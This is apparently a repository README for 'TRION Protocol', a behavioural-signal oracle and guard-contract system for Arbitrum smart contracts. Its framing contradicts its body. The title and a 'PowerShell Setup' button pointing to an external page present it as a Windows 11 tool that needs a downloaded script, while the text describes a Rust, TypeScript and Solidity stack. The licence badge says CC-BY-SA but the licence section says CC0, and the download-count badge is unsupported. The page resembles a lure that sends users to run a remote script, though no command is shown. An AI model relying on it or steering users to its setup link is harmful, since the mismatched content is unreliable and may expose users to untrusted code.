<div align="center">

# TRION Protocol: Portable Self-Verifying Behavioral Identity System for Windows 11

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://Ravindra-2006.github.io/trion-protocol/)

[![powershell-7](https://img.shields.io/badge/Powershell--7-7%2B-a855f7?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Cc--By--Sa--4.0-9333ea?style=for-the-badge&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/Channel-Production-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/Pulls-1.2K-7c3aed?style=for-the-badge&labelColor=0d1117)]()

</div>

---

TRION Protocol is a substrate-independent behavioral truth infrastructure that treats behavior as a permanent, portable, self-verifying substance from which identity is composed and around which civilization can be organized. Rather than validating price like conventional DeFi security systems, TRION validates behavior by extracting eight normalized features per block, computing a coherence score against an exponential moving average baseline, and declaring an anomaly when deviation exceeds a fixed threshold. The system spans a zero-dependency Rust L0 engine, a TypeScript relayer that packs signals into a single 256-bit integer, a quorum-verified Solidity oracle, and an enforcement guard that gates sensitive contract execution on signal freshness and coherence. Integrated contracts inherit the guard and decorate critical functions with a coherence modifier, ensuring execution proceeds only when the pre-published signal for the bound transaction identifier passes verification.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

**Behavioral signal engine:** A zero-dependency Rust L0 layer polls the target chain at fixed intervals, extracts a fixed vector of behavioral features per block, and derives a normalized coherence score from them. Each feature is individually normalized to a bounded range, so the score remains comparable across network conditions and time.

- **Adaptive baseline tracking:** A long-horizon exponential moving average establishes the behavioral norm, while a sliding-window average captures short-run activity. Anomalies are declared deterministically when the current coherence score diverges from the baseline beyond a configurable relative threshold, eliminating manual tuning per deployment.

- **Deterministic signal packing:** Signals are serialized into a single 256-bit word with fixed bit-field offsets for status, coherence, threshold, block number, and timestamp. The layout is stable and independently implementable, allowing any language or runtime to construct and decode payloads without shared libraries.

- **Quorum-verified publication:** The relayer signs each packed signal and submits it to the on-chain oracle, which enforces registered-validator membership, ascending address ordering to prevent replay and duplicate submission, and a configurable minimum signature count before a signal is stored.

- **Context-bound execution gating:** The guard derives a transaction identifier from the calling contract, sender, calldata, and chain identifier, then verifies the stored signal against that identifier at execution time. A signal published for one caller cannot authorize the same call from another address, and a signal cannot be replayed across chains.

- **Dual freshness enforcement:** Stored signals are bounded by both wall-clock age and block distance from publication. Either bound expiring causes the guard to reject execution, preventing authorization from stale network states.

- **Fail-closed by default:** Missing, stale, or non-safe signals cause an explicit revert rather than silent passage. An owner-controlled bypass flag provides a fail-open mode for emergency maintenance, scoped to the inheriting contract.

- **Drop-in contract integration:** Sensitive functions are protected by inheriting the guard base contract and applying a single modifier. No changes to business logic, storage layout, or call patterns are required, and the oracle address is supplied once at construction.

- **Typed SDK surface:** A TypeScript module exposes pack and unpack primitives for the 256-bit signal format, enabling off-chain tooling, dashboards, and test harnesses to construct and inspect signals without duplicating the bit-field specification.

- **Substrate-independent design:** The feature extraction, scoring, and enforcement layers are decoupled from any specific chain or runtime. The same behavioral model can be pointed at a different execution environment by replacing only the block ingestion adapter.

## How It Works

The protocol operates on a strict separation between observation, attestation, and enforcement. A behavioral baseline is established from live network data, each execution context is evaluated against that baseline, and the resulting verdict is cryptographically attested before any guarded contract acts on it. The workflow proceeds in five stages.

**1. Behavioral feature extraction**

A native collection engine polls the target chain at short intervals and, for every block, derives a fixed set of normalized behavioral features. These features capture activity shape rather than asset price — transaction density, fee volatility, net value flow, sender concentration, counterparty diversity, contract-call ratio, gas-limit skew, and zero-value transfer entropy. Each feature is mapped to the unit interval, producing a compact behavioral fingerprint per block.

**2. Coherence scoring and anomaly detection**

The extracted features are aggregated into a single coherence score representing how closely current activity matches the established norm. A long-horizon exponential moving average maintains the baseline, while a short-horizon sliding average tracks recent drift. When the coherence score falls below the baseline by more than a configurable relative margin, the engine flags an anomaly. This dual-window design distinguishes genuine structural deviation from ordinary volatility.

**3. Signal encoding**

Detection results are serialized into a single fixed-width integer. The payload carries a status code, the current coherence value, the active threshold, the originating block number, and a Unix timestamp, each occupying a deterministic bit range. Because the format is compact and fully specified, any downstream component — relayer, SDK, or contract — can decode or reconstruct a signal without ambiguity.

**4. Quorum attestation and publication**

A relayer service reads the latest engine output, classifies it as a safe, warning, or silence state, and derives a deterministic transaction identifier from the execution context. The encoded payload is signed by registered validators using a standard message-signing scheme and submitted to an on-chain oracle contract. The oracle enforces that signers are known validators, that signatures are ordered and deduplicated, and that the signature count meets the configured quorum before persisting the signal.

**5. Guarded execution**

Contracts integrate protection by inheriting a guard base and decorating sensitive entry points. At call time, the guard reconstructs the transaction identifier from the caller, calldata, contract address, and chain identifier, then queries the oracle. Execution proceeds only when a stored signal exists, carries a safe status, and satisfies both freshness bounds — a maximum age in seconds and a maximum block distance. Missing, stale, or non-safe signals cause an immediate revert. A fail-open bypass flag exists for emergency maintenance but remains under the integrating contract's ownership.

**Binding and replay resistance**

Because the transaction identifier is deterministically derived from the exact call context, a signal issued for one caller cannot authorize the same calldata from a different address, and signals from earlier network states cannot be replayed. Requiring ascending signer order eliminates duplicate signature submission, and the independent timestamp and block-number checks ensure that attestations expire even if one freshness dimension is compromised.

**Integration surface**

The packaged SDK exposes encode and decode helpers for the signal format, allowing off-chain services to construct payloads and integrators to inspect them. The oracle interface is minimal and stable, so guarded contracts depend only on a single verification call. This keeps integration overhead low while preserving the fail-closed default that makes the protection meaningful.

## Compatibility

TRION Protocol is designed for integration with existing EVM-based infrastructure. Its components impose minimal coupling on host systems and can be adopted incrementally, from passive monitoring to full on-chain enforcement.

**Runtime Requirements**

- **Operating systems:** Windows 10/11 (x64), macOS 12+ (Intel and Apple Silicon), Ubuntu 20.04+ and comparable Linux distributions.
- **Node.js:** Version 20 or later, with pnpm as the package manager for the relayer workspace.
- **Rust:** Stable toolchain for building the L0 engine.
- **Solidity tooling:** Hardhat for contract compilation, testing, and deployment.
- **Memory and storage:** Sufficient headroom for continuous JSON-RPC polling; the L0 engine writes a small JSON snapshot per block cycle and does not require a persistent database.

**Chain and RPC Compatibility**

- **Target network:** Arbitrum, with the sequencer polled at approximately 250 ms intervals via `eth_getBlockByNumber`.
- **Testnet deployment:** Arbitrum Sepolia hosts the current `TRIONOracleV3` and reference integration contracts.
- **RPC interface:** Any endpoint exposing standard Ethereum JSON-RPC methods is compatible; no proprietary or vendor-specific APIs are required.

**Contract Compatibility**

- **Solidity:** `TRIONGuardV3` is an abstract base contract intended for inheritance. Contracts already using OpenZeppelin primitives (such as `Ownable`) compose cleanly alongside it.
- **Integration pattern:** Sensitive functions are decorated with the `onlyWhenCoherent` modifier; no changes to existing storage layout or business logic are needed beyond the modifier and constructor wiring.
- **Fail modes:** The Guard fails closed by default and exposes a fail-open bypass controlled by the inheriting contract's owner for emergency maintenance.

**Signal and SDK Compatibility**

- **Signal format:** A single `uint256` packs status, coherence, threshold, block number, and timestamp. `TrionSDK.packSignal()` and `TrionSDK.unpackSignal()` provide round-trip construction and decoding in TypeScript.
- **Signing:** EIP-191 `personal_sign` payloads with strictly ascending signer ordering; compatible with standard ECDSA validator key management.
- **Freshness bounds:** Signals are valid within a 300-second window and a 50-block horizon, enforced independently at verification time.

**Interoperability Notes**

- **Backward compatibility:** Signal packing reserves fixed bit ranges, allowing future status values and field extensions without breaking existing decoders.
- **Multi-validator readiness:** The oracle verifies quorum signatures by default; testnet configurations may run with a single validator, while production deployments require quorum ≥ 3.
- **Degraded conditions:** If the RPC feed degrades, the relayer withholds publication and integrated contracts revert with `TRION_SignalStaleOrMissing` until a fresh signal is available — an intentional fail-closed posture rather than silent degradation.

## FAQ

**Is TRION a price oracle?**
No. TRION does not ingest, aggregate, or relay asset prices. It computes a behavioral coherence score from on-chain execution features and publishes that score as a signal. Any contract integrating the Guard makes its own decision about whether to proceed; TRION never asserts a fair value for any asset.

**What does "substrate-independent" mean in practice?**
The coherence computation, signal packing format, and quorum verification logic are decoupled from any single execution environment. The reference implementation targets Arbitrum via JSON-RPC, but the feature extraction layer and the 256-bit signal encoding are transport-agnostic. Porting to another chain requires a new block adapter, not a redesign of the signal model.

**Why 8 features, and can I change them?**
The feature set (f1–f8) is the smallest collection that captures transaction density, fee pressure, value flow, sender concentration, counterparty diversity, contract interaction rate, gas skew, and zero-value entropy without redundancy. The L0 engine normalizes each feature to `[0, 1]`, so the coherence score remains comparable across configurable feature sets. Custom feature vectors are supported, but any change to the feature basis invalidates historical EMA baselines and requires a re-bootstrap period.

**How is the coherence score computed, and what does the 15% threshold represent?**
Coherence `C(t)` is the arithmetic mean of the eight normalized features for a given block. An exponential moving average `μ(t)` tracks the long-run baseline, and an anomaly is declared when the relative drop `(μ(t) − C(t)) / μ(t)` exceeds 0.15. The threshold is a tunable constant; raising it reduces false positives during ordinary volatility, lowering it increases sensitivity to transient distortions.

**What is the difference between SAFE, WARN, and SILENCE?**
SAFE (status 1) authorizes execution through the Guard. WARN (status 2) records a degraded coherence reading without authorizing execution. SILENCE (status 3) records that no reliable signal could be produced — for example, due to a degraded RPC feed — and is treated as non-authorizing. The Guard fails closed on anything other than SAFE.

**Why does the Guard fail closed by default?**
Fail-closed behavior ensures that a missing, stale, or incoherent signal cannot silently authorize a sensitive call. The default revert paths are `TRION_SignalStaleOrMissing` and `TRION_ExecutionBlocked`. A fail-open path exists via `trionBypassEnabled`, but it is owner-controlled and intended strictly for emergency maintenance windows.

**How does txId binding prevent replay across callers?**
The txId is derived from `keccak256(abi.encode(address(this), msg.sender, msg.data, block.chainid))`. Because the caller address and calldata are part of the digest, a signal published for one caller cannot authorize the identical call from a different address, and a signal cannot be replayed on another chain.

**What keeps a signal from being reused after network conditions change?**
Two independent freshness bounds apply at verification time: a 300-second wall-clock window and a 50-block age limit. A signal that satisfies one bound but violates the other is rejected. This dual constraint prevents replay from earlier network states even when clock skew or block timing varies.

**How does quorum signing work, and why must signatures be sorted?**
Each signal is co-signed by registered validators using EIP-191 `personal_sign`. The oracle requires the signature array to be ordered ascending by signer address and deduplicates entries before counting, which prevents duplicate submission and makes the quorum count deterministic. The default `quorumRequired` is 2; mainnet deployments require at least 3 independent validators to obtain Byzantine fault tolerance.

**What happens if the L0 engine loses its RPC connection?**
The L0 engine will not emit a fresh signal, and the relayer will refuse to publish stale data. Integrated contracts will revert with `TRION_SignalStaleOrMissing` until a fresh SAFE signal is available. This is intentional: the system prefers denial of execution over authorization on unreliable input.

**Can I configure different thresholds per integrating protocol?**
Per-protocol coherence thresholds are on the roadmap. In the current release, the anomaly threshold is a property of the L0 engine, and the Guard enforces the freshness and status constraints uniformly. Integrators can layer their own additional checks on top of `onlyWhenCoherent`.

**Is the SDK required for integration?**
No. The SDK provides `packSignal()` and `unpackSignal()` for constructing and decoding the 256-bit signal format in TypeScript, which is useful for relayer implementations and off-chain tooling. On-chain integration requires only inheriting `TRIONGuardV3` and passing the oracle address to the constructor.

**What is the security assumption behind validator honesty?**
TRION assumes registered validators are honest and available, and that they sign only signals they have independently verified. If all validators collude, false signals can be published; this risk is mitigated by expanding the validator set and raising the quorum threshold. The oracle contract address must also be protected at the key-management level.

**Does the reference vault constitute a production integration?**
No. `TRIONProtectedVault` is included as a reference example to demonstrate the integration pattern. It is not audited for production use and should not be deployed as-is. Integrators should treat it as documentation of the Guard's expected call flow.

## Disclaimer

TRION Protocol is provided as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. No representation is made regarding the accuracy, completeness, reliability, or suitability of the software, its behavioral models, its coherence scores, or any signals it generates, publishes, or enforces.

The behavioral coherence detection mechanism is probabilistic and threshold-based. It extracts eight features per block, compares them against an exponential moving average baseline, and declares an anomaly when the coherence score deviates beyond a configurable threshold. This design inherently produces both false positives and false negatives. A SAFE signal does not constitute a guarantee of execution safety, solvency, or protocol correctness, and an anomaly signal does not constitute a guarantee of malicious activity. Integrators must not treat TRION signals as the sole authorization for high-value operations.

The validator quorum model assumes that registered validators are honest and independently verify signals before signing. Collusion among validators at or above the quorum threshold can produce false or misleading signals that will be accepted by the oracle. The default testnet configuration does not provide Byzantine fault tolerance and is intended solely for development and evaluation purposes. Deployment to production requires a validator set and quorum threshold appropriate to the integrator's threat model, and that configuration is the sole responsibility of the integrator.

Signal freshness bounds (timestamp and block-number windows), fail-closed defaults, and the emergency bypass flag are security-relevant configuration surfaces. Misconfiguration of any of these parameters — including an excessively permissive bypass or an excessively short freshness window — may cause either denial of legitimate execution or acceptance of stale authorization. Integrators are responsible for auditing their own inheritance of TRIONGuardV3, their constructor arguments, and their owner-key management.

The off-chain components (the Rust L0 engine and the relayer) depend on the availability and correctness of external RPC endpoints. Degraded, delayed, or manipulated RPC data can produce stale or incorrect signals. The L0 engine and relayer are reference implementations and have not been subjected to a formal security audit; no audit status, formal verification, or bug bounty coverage should be inferred from their inclusion.

Nothing in this repository constitutes financial, legal, or security advice. Use of TRION Protocol in production, in combination with other protocols, or in any context involving real value is undertaken entirely at the user's own risk. The authors and contributors accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use of, inability to use, or reliance on this software or the signals it produces.

## License

TRION Protocol is released under the Creative Commons CC0 1.0 Universal dedication. The software is dedicated to the public domain worldwide; no rights are reserved, and no attribution, notice, or royalty obligation is imposed on any downstream use.

**Grant of rights.** Any recipient may copy, modify, merge, publish, distribute, sublicense, sell, or otherwise exploit the source code, the compiled binaries, the on-chain contracts, and the accompanying documentation in any form and for any purpose, commercial or non-commercial, without restriction and without permission from or notice to the authors.

**No warranty.** The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, title, and non-infringement. The authors make no representation that the behavioral-signal pipeline, the quorum verification logic, the signal-packing format, or any deployed contract is free of defects, and assume no liability for any claim, damages, or other obligation arising from use of the software or from any transaction executed against an integrated contract.

**Patent posture.** To the extent the authors hold patent rights necessarily infringed by the implementation as distributed, those rights are waived and dedicated to the public on the same terms as the copyright dedication. No express or implied patent license is granted for modifications that introduce functionality absent from the original distribution.

**Third-party components.** The dependency surface is intentionally narrow. The Rust L0 engine is written with zero external crates. The relayer depends on the Node.js runtime and standard TypeScript tooling. The contracts depend on an external smart-contract library for ownership primitives. Each dependency remains governed by its own license, and recipients are responsible for compliance with those terms independently of the CC0 dedication covering TRION-authored code.

**Deployment note.** The dedication applies to the source and to any artifacts produced from it. It does not extend to third-party networks, validator infrastructure, RPC providers, or key-management systems operated by integrators. Operators who deploy the oracle or inherit the guard modifier are solely responsible for their own configuration, validator set, quorum threshold, freshness bounds, and bypass governance.

**Contributions.** By submitting a contribution to the project, a contributor affirms that they have the right to do so and agrees that the contribution is dedicated to the public domain under these same terms. No contributor license agreement is required and no separate copyright assignment is sought.